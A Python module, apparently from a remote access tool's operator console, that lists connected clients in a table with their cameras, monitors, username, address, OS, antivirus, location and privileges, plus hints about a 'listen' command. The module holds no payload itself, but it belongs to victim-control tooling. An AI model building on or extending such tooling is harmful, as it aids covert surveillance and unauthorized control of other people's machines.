import tabulate

from domestic.utility.status_message import *
from domestic.global_state import *


def list_clients():
  number_of_clients_connected = len(state['sockets']['clients'][0])
  clients_list = state['sockets']['clients'][1]
  all_clients = []

  if number_of_clients_connected == 0 and state['sockets']['server'] is None:
    status_message(f'Use \'listen\' command to enable clients to connect\nConnected clients can be listed & interacted with', 'primary', {'end': True})
  elif number_of_clients_connected == 0:
    status_message('You are listening for clients\nBut none are currently connected', 'primary', {'end': True})
  else:
    for index, addr in enumerate(clients_list):
      user_data = state['sockets']['clients'][2][index]
      all_clients.append([index, user_data['monitors'], user_data['cams'], user_data['io-channels'], f"{user_data['username']}", user_data['address'], user_data['os'], user_data['antivirus'], user_data['location'], user_data['privileges']])
    
    status_message(tabulate.tabulate(all_clients, headers=['Index', 'Monitors', 'Cams', 'I/O Channels', 'Username@Hostname', 'Address', 'Operating System', 'Antivirus', 'Location', 'Privileges']), 'pure', {'end': True})
  
  print()
  status_message(None, 'program')